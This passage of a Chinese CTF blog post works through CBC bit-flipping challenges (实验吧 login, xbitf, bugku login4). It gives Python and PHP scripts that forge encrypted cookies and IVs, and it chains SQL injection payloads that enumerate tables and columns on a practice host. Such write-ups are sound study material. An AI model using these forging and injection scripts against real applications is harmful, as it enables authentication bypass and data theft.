class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denglu</span><span class="params">(payload,idx,c1,c2)</span>:</span></span><br><span class="line">    url=<span class="string">r'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = &#123;<span class="string">'id'</span>: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">    iv=re.findall(<span class="string">r"iv=(.*?),"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    cipher=re.findall(<span class="string">r"cipher=(.*)"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=<span class="string">''</span>.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;<span class="string">'iv'</span>: iv,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>, cont)[<span class="number">0</span>]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    iv_new=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;<span class="string">'iv'</span>: iv_new, <span class="string">'cipher'</span>: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    <span class="keyword">print</span> rcont</span><br><span class="line"></span><br><span class="line">denglu(<span class="string">'12'</span>,<span class="number">4</span>,<span class="string">'2'</span>,<span class="string">'#'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
+<p>自己的脚本会出现错误</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">post=&#123;<span class="string">'id'</span>:<span class="string">"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);"</span>+chr(<span class="number">0</span>)&#125;</span><br><span class="line">responce=requests.post(url,data=post)</span><br><span class="line"></span><br><span class="line">iv=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"iv=(.*?),"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"cipher=(.*)"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">(cipher,old_iv,offset,old_letter,new_letter)</span>:</span></span><br><span class="line">    cipher=list(cipher)</span><br><span class="line">    cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset]))</span><br><span class="line">    cipher=<span class="string">''</span>.join(cipher)</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(old_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    wrong_plain=base64.b64decode(re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>,res.content)[<span class="number">0</span>])</span><br><span class="line">    new_iv = <span class="string">''</span></span><br><span class="line">    right=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i]))</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(new_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer(cipher,iv,<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
+<p>错误报告如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &apos;2)ion select * from((select 1)a</span><br><span class="line">join (select 2)b join (select 3)c);&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题?<br>
+明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的<br>
+一个偏移位置为6，一个为7，这个正则要好好看看</p>
+<h2 id="javisoj-xman-2019-xbitf">javisoj xman 2019 xbitf</h2>
+<p>源代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unbuffered</span><span class="params">(object)</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, attr)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> getattr(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="comment">#import signal</span></span><br><span class="line"><span class="comment">#signal.alarm(600)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=open(<span class="string">"/root/xbitf/flag"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc</span><span class="params">(key,iv,m)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc_dec</span><span class="params">(key,iv,c)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">16</span>)</span><br><span class="line">iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">session=os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">token=<span class="string">"session="</span>+session.encode(<span class="string">"hex"</span>)+<span class="string">";admin=0"</span></span><br><span class="line"> </span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line"><span class="keyword">print</span> token+<span class="string">";checksum="</span>+checksum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    token_rcv=raw_input(<span class="string">"token:"</span>)</span><br><span class="line">    <span class="keyword">if</span> token_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span> <span class="keyword">and</span> token_rcv.split(<span class="string">"session="</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">16</span>].decode(<span class="string">"hex"</span>)==session:</span><br><span class="line">        c_rcv=token_rcv.split(<span class="string">"checksum="</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        <span class="comment"># 讲解码的结果打印出来</span></span><br><span class="line">        <span class="keyword">print</span> m_rcv</span><br><span class="line">        <span class="keyword">if</span> m_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>解题脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">plain = <span class="string">"session=c3b76cc709a8fddf;admin=0"</span></span><br><span class="line">checksum=<span class="string">"92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29"</span></span><br><span class="line"></span><br><span class="line">bit = (ord(checksum.decode(<span class="string">'hex'</span>)[<span class="number">15</span>]) ^ord(<span class="string">'0'</span>) ^ ord(<span class="string">'1'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容</span></span><br><span class="line">checksum_final = checksum[:<span class="number">30</span>] + hex(bit)[<span class="number">2</span>:] + checksum[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">print</span> checksum_final</span><br></pre></td></tr></table></figure>
+<p>在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/62346910-70f6ff00-b52a-11e9-9827-95e90cbebd1d.png" alt="image"></p>
+<h2 id="bugku-login4">bugku login4</h2>
+<p>这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：</p>
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80684485" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80684485</a></p>
+<p><a href="https://www.jianshu.com/p/a61756e54f4f" target="_blank" rel="noopener">https://www.jianshu.com/p/a61756e54f4f</a></p>
+<p>自己的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iv=<span class="string">'4NyZMJ9AOU5JGstqfld10A%3D%3D'</span>;</span><br><span class="line">$cipher=<span class="string">'T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D'</span>;</span><br><span class="line"><span class="comment">//username=bdmin password=111</span></span><br><span class="line"></span><br><span class="line">$iv=base64_decode(urldecode($iv));</span><br><span class="line">$cipher=base64_decode(urldecode(($cipher)));</span><br><span class="line"></span><br><span class="line">$source=<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'bdmin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'111'</span>);</span><br><span class="line">$plain=serialize($source);</span><br><span class="line"></span><br><span class="line">$plain1 = substr($plain,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">$plain2 = substr($plain,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">$cipher[<span class="number">9</span>] = chr(ord($cipher[<span class="number">9</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'a'</span>));</span><br><span class="line"></span><br><span class="line">$new_iv=<span class="string">''</span>;</span><br><span class="line">$wrong_plain=base64_decode(<span class="string">"U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ=="</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">    $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv)).<span class="string">'   '</span>.urlencode(base64_encode($cipher));</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/31/about-preg-replace/" rel="next" title="preg_replace相关">
+                <i class="fa fa-chevron-left"></i> preg_replace相关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/dogdog.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4ser1" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://forever404.cn" title="Forever" target="_blank">Forever</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yml-sec.top/" title="YeMoLi" target="_blank">YeMoLi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://althims.com" title="Moyu" target="_blank">Moyu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://handsomedog.top" title="Handsomedog" target="_blank">Handsomedog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fightingtree.github.io" title="FightingTree" target="_blank">FightingTree</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-东北赛区-Day2-Web3-Point-System"><span class="nav-number">1.</span> <span class="nav-text">[CISCN2019 东北赛区 Day2 Web3]Point System</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验吧-简单的登陆题"><span class="nav-number">2.</span> <span class="nav-text">实验吧 简单的登陆题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javisoj-xman-2019-xbitf"><span class="nav-number">3.</span> <span class="nav-text">javisoj xman 2019 xbitf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bugku-login4"><span class="nav-number">4.</span> <span class="nav-text">bugku login4</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">73.9k</span>
+  
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('3');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
